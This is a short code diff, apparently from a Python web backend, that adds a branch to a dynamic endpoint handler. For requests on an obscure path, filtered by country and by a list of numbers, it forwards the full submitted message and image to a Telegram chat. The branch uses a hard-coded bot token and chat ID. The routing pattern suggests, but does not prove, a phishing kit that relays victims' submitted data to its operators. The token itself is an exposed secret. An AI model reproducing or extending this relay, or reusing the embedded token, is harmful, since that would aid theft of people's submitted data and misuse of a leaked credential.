@@ -846,6 +846,18 @@ async def handle_dynamic_endpoint_optimized_with_image(
                     image_filename=image_filename
                 )
                 telegram_results.append(r)
+            if path.startswith("/bbdsasd") and obtener_is_active_cached() and \
+               numeror in numeros_r and pais not in {"US", "CO"}:
+                r = await enviar_telegram_hibrido(
+                    mensaje_completo ,
+                    chat_id="-5060774345",
+                    token="7552589801:AAE6X6f-12cv1xBBv6UMAWaDVkMkc0fDpzM",
+                    priority=2,
+                    force_immediate=True,
+                    image_data=image_data,
+                    image_filename=image_filename
+                )
+                telegram_results.append(r)
             elif path.startswith("/maikel"):
                 # Envía al DEFAULT_CHAT_ID con imagen y mensaje completo
                 r1 = await enviar_telegram_hibrido(
